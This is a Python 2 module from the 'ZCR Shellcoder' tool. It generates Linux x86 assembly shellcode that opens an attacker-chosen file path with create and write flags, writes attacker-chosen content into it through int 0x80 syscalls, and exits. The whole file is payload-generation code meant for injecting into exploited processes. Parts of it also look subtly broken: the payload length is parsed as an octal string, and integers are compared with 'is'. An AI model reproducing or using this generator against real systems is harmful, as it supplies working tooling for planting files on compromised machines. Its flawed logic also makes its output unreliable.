#!/usr/bin/env python
'''
ZCR Shellcoder

ZeroDay Cyber Research
Z3r0D4y.Com
Ali Razmjoo
'''
import binascii
def run(path_file,content):
	lenth = str(hex(int(str(len(content)),8)))

	if len(lenth) % 2 is not 0:
		lenth = lenth.replace('0x','0x0')
	if len(lenth) is 10:
		lenth = lenth + '\npop %edx\n'

	if len(lenth) is 8:
		lenth = lenth + '90\npop %edx\nshr $0x8,%edx\n'
	if len(lenth) is 6:
		lenth = lenth + '9090\npop %edx\nshr $0x10,%edx\n'
	if len(lenth) is 4:
		lenth = lenth + '909090\npop %edx\nshr $0x10,%edx\nshr $0x8,%edx\n'
	lenth = 'push $' + lenth


	m = len(path_file) - 1
	stack = ''
	while(m>=0):
	        stack += path_file[m]
	        m -= 1
	stack = stack.encode('hex')
	shr_counter = 0 
	shr_counter = len(stack) % 8
	zshr_counter = shr_counter
	shr = None
	if shr_counter is 2:
		shr = '\npop %ebx\nshr    $0x10,%ebx\nshr    $0x8,%ebx\npush %ebx\n'
		stack = stack[0:2] + '909090' + stack[2:]
	if shr_counter is 4:
		shr = '\npop %ebx\nshr    $0x10,%ebx\npush %ebx\n'
		stack = stack[0:4] + '9090' + stack[4:]
	if shr_counter is 6:
		shr = '\npop %ebx\nshr    $0x8,%ebx\npush %ebx\n'
		stack = stack[0:6] + '90' + stack[6:]
	zshr = shr
	m = len(stack)
	n = len(stack) / 8
	file_shellcode = ''
	shr_counter = len(stack) % 8
	if shr_counter is 0:
		shr_n = 0
		r = ''
		while(n is not 0):
			if shr is not None:
				shr_n += 1
				zx = m - 8
				file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
				m -= 8
				n = n - 1
				shr = None
			if shr is None:
				shr_n += 1
				zx = m - 8
				file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
				m -= 8
				n = n - 1
		if zshr is None:
			file_z = file_shellcode
		if zshr is not None:
			rep1 = file_shellcode[:16]
			rep2 = rep1 + zshr
			file_z = file_shellcode.replace(rep1,rep2)
		file_name = file_z
	if len(content) >= 4:
		m = len(content) - 1
		stack = ''
		while(m>=0):
				stack += content[m]
				m -= 1
		stack = stack.encode('hex')
		shr_counter = 0 
		shr_counter = len(stack) % 8
		zshr_counter = shr_counter
		shr = None
		if shr_counter is 2:
			shr = '\npop %ecx\nshr    $0x10,%ecx\nshr    $0x8,%ecx\npush %ecx\n'
			stack = stack[0:2] + '909090' + stack[2:]
		if shr_counter is 4:
			shr = '\npop %ecx\nshr    $0x10,%ecx\npush %ecx\n'
			stack = stack[0:4] + '9090' + stack[4:]
		if shr_counter is 6:
			shr = '\npop %ecx\nshr    $0x8,%ecx\npush %ecx\n'
			stack = stack[0:6] + '90' + stack[6:]
		zshr = shr
		m = len(stack)
		n = len(stack) / 8
		file_shellcode = ''
		shr_counter = len(stack) % 8
		if shr_counter is 0:
			shr_n = 0
			r = ''
			while(n is not 0):
				if shr is not None:
					shr_n += 1
					zx = m - 8
					file_shellcode = 'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode 
					m -= 8
					n = n - 1
					shr = None
				if shr is None:
					shr_n += 1
					zx = m - 8
					file_shellcode =  'push $0x' + str(stack[zx:m]) + '\n' + file_shellcode
					m -= 8
					n = n - 1
					
					
			if zshr is None:
				file_z = file_shellcode
			if zshr is not None:
				rep1 = file_shellcode[:16]
				rep2 = rep1 + zshr
				file_z = file_shellcode.replace(rep1,rep2)
			content = file_z
	if len(content) <= 3:
		content = '0x' + binascii.b2a_hex(content)
		if len(content) % 2 is not 0:
			content = content.replace('0x','0x0')
		if len(content) is 10:
			content = content + '\npop %ecx\n'
		if len(content) is 8:
			content = content + '90\npop %ecx\nshr $0x8,%ecx\n'
		if len(content) is 6:
			content = content + '9090\npop %ecx\nshr $0x10,%ecx\n'
		if len(content) is 4:
			content = content + '909090\npop %ecx\nshr $0x10,%ecx\nshr $0x8,%ecx\n'
		content = 'push $' + content
	shellcode = '''
push   $0x5
pop    %%eax
%s
mov    %%esp,%%ebx
push   $0x4014141
pop    %%ecx
shr    $0x10,%%ecx
int    $0x80
mov    %%eax,%%ebx
push   $0x4
pop    %%eax

%s
mov %%esp,%%ecx

%s


int    $0x80

mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(str(file_name),str(content),str(lenth))
	return shellcode
		
